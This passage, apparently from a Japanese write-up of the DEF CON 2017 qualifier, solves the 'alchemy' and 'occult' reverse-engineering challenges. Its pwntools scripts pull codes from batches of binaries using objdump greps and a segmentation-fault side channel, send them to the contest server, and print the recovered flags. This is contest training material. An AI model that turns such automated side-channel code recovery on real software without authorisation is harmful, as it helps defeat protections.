xe626f6e65732c20746865207377656c6c206f662068657220636c65617661676520696e20746865206f6c642076x3ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff00x1x1x2x3ffffffffffffff00ffx2x4ffx1x100ffffffffffff1aff1aff1a00000000ffff3f3f3fff00003f3fff00ff202020ff20202020ff3f00403f3f3f3f3f7f40
$ unhex
$ alchemy_dist/024ae029889401df92b0646be0394557b28c602740951e70cdecbc2ea5544f99
enter code:
bones, the swell of her cleavage in the old v
sum is 6
```

正解です。自動化しましょう。

```python
from subprocess import *
from pwn import *

s = remote('cm2k-alchemy_c745e862098878b8052e1e9588c59bff.quals.shallweplayaga.me', 12004)
s.recvline()

for _ in range(10):
  t = s.recvline().strip()
  log.info(t)

  p = Popen(r'objdump -M intel -d alchemy_dist/%s | grep "cmp    r[ac]x,0x"' % t, shell=True, stdout=PIPE, stderr=PIPE)
  out = p.communicate()[0]
  res = ''
  for line in out.splitlines():
    if 'x' in line[-2:] or '00 00 00' in line:
      continue
    c = chr(int(line[-2:], 16))
    if not (' ' <= c <= '~'):
      continue
    res += c
    if 'rax' in line:
      break
  log.info(res)

  s.send(res.encode('base64'))

s.interactive()
s.close()
```

```
end of the world sun clyigujheo
```

### occult (84)

`e5a21c895eca716012fca19649142695bec4f064d7103fe95ffaed74baf8242d.tar.bz2` と `libchicken.so.8` というファイルが与えられました。`e5a21c895eca716012fca19649142695bec4f064d7103fe95ffaed74baf8242d.tar.bz2` を展開してみると 200 個の x86_64 の ELF が出てきました。

適当に 1 個を選んで実行してみましょう。

```
$ LD_LIBRARY_PATH="$LD_LIBRARY_PATH:$HOME/ctf/defconquals2017/occult"
$ occult_dist/005543e8f62ccac2128fd9edf85fe0960d685237ea41fd60aaa5f624757c5208
enter code:
a
$ for c in {a..z}; do echo "[$c]"; echo $c | occult_dist/005543e8f62ccac2128fd9edf85fe0960d685237ea41fd60aaa5f624757c5208; done
[a]
enter code:
[b]
enter code:
[c]
enter code:
[d]
enter code:
[e]
enter code:
[f]
enter code:
[g]
enter code:
[h]
enter code:
[i]
enter code:
[j]
enter code:
[k]
enter code:
[l]
enter code:
[m]
enter code:
[n]
enter code:
[o]
enter code:

Error: segmentation violation
[p]
enter code:
[q]
enter code:
[r]
enter code:
[s]
enter code:
[t]
enter code:
[u]
enter code:
[v]
enter code:
[w]
enter code:
[x]
enter code:
[y]
enter code:
[z]
enter code:
```

`o` を入力した場合だけ `segmentation violation` とエラーが発生しました。入力が途中まで一致している場合にだけエラーが発生するようです。これを利用してこのバイナリのコードを手に入れてみましょう。

```python
import re
from subprocess import *
from pwn import *

def get_code(f):
  res = ''
  t = string.printable[:string.printable.index('\n')]
  while True:
    for c in t:
      p = Popen('occult_dist/' + f, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
      o, e = p.communicate(res + c)
      if 'segmentation violation' in e:
        res += c
        print res
        break
      if 'sum is' in o:
        res += c
        return res
    else:
      log.error('tsurai')
      return res

print get_code('005543e8f62ccac2128fd9edf85fe0960d685237ea41fd60aaa5f624757c5208')
```

```
$ python s.py
o
on
on,
on,
on, w
on, we
on, we
on, we c
on, we ca
on, we can
on, we can
on, we can c
on, we can ch
on, we can cha
on, we can chas
on, we can chase
on, we can chase
on, we can chase h
on, we can chase he
on, we can chase her
on, we can chase her
on, we can chase her o
on, we can chase her of
on, we can chase her off
on, we can chase her off
on, we can chase her off r
on, we can chase her off ri
on, we can chase her off rig
on, we can chase her off righ
on, we can chase her off right
on, we can chase her off right
on, we can chase her off right n
on, we can chase her off right no
on, we can chase her off right now
on, we can chase her off right now.
on, we can chase her off right now.
on, we can chase her off right now. S
on, we can chase her off right now. Sa
on, we can chase her off right now. Sab
on, we can chase her off right now. Sabo
on, we can chase her off right now. Sabot
```

本番です。サーバに接続してみましょう。

```python
import string
from subprocess import *
from pwn import *

def get_code(f):
  res = ''
  t = string.printable[:string.printable.index('\n')]
  while True:
    for c in t:
      p = Popen('occult_dist/' + f, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
      o, e = p.communicate(res + c)
      if 'segmentation violation' in e:
        res += c
        print res
        break
      if 'sum is' in o:
        res += c
        return res
    else:
      log.error('tsurai')
      return res

s = remote('cm2k-occult_92090ea70651a37c143d1af2ac714445.quals.shallweplayaga.me', 12005)
s.recvline()

for _ in range(10):
  t = s.recvline().strip()
  log.info(t)

  res = get_code(t)
  log.info(res)

  s.send(res.encode('base64'))

s.interactive()
s.close()
```

```
xenoanthropology UtFafEigBu
```
